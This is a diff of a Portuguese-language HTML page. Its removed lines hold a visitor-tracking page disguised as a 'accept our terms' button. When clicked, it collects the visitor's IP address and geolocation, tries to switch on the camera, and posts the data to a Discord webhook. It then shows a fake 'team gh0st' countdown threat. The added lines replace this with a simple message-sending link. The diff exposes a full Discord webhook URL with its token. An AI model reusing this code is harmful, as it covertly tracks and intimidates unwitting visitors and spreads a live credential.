@@ -1,43 +1,24 @@
 <!DOCTYPE html>
 <html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        button { padding: 20px; background: #222; color: white; border: 1px solid #444; cursor: pointer; }
-        #error { display:none; color: red; }
-    </style>
-</head>
 <body>
-    <div id="content">
-        <h2>Aceite nossos termos para evitar contrabandeio do nosso exclusivo conteúdo</h2>
-        <button onclick="hack()">ACEITAR TERMOS</button>
-    </div>
-    <div id="error">
-        <h1 style="font-size:40px;">Ops, team gh0st não encontrou o sinal</h1>
-        <p style="font-size:20px;">CONTAGEM REGRESSIVA PARA A KWGDYUA CHEGAR: <span id="timer">20:00</span></p>
-        <div style="font-size: 100px;">  </div>
-    </div>
+
+    <a href="#" onclick="enviarWebhook(event)">Clique aqui para enviar a mensagem</a>
+
     <script>
-        async function hack() {
+        function enviarWebhook(event) {
+            event.preventDefault(); // Impede o link de recarregar a página
+            
             const url = "https://discord.com/api/webhooks/1495993264635904051/8MyNvYn9qsFMh44kkgHg11nf7v7BoACoim1eKPBvdbeeVQn7wmVN355wyqv1c94-uyTO";
-            const ipRes = await fetch('https://ipify.org').then(r => r.json());
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                send(url, ipRes.ip, `${p.coords.latitude}, ${p.coords.longitude}`);
-            }, () => { send(url, ipRes.ip, "Negada"); });
-            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});
-            document.getElementById('content').style.display = 'none';
-            document.getElementById('error').style.display = 'block';
-            let t = 1200; setInterval(() => {
-                t--; let m = Math.floor(t/60), s = t%60;
-                document.getElementById('timer').innerText = `${m}:${s<10?'0':''}${s}`;
-            }, 1000);
-        }
-        async function send(url, ip, loc) {
-            fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `novo acesso em site flsko pq pa😈🤔\n**IP:** ${ip}\n**Localização:** ${loc}\n**Câmera:** Frontal Ativada` })
-            });
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: 'kajavwh' })
+            })
+            .then(() => alert('Mensagem enviada!'))
+            .catch(err => console.error('Erro ao enviar:', err));
         }
     </script>
+
 </body>
 </html>
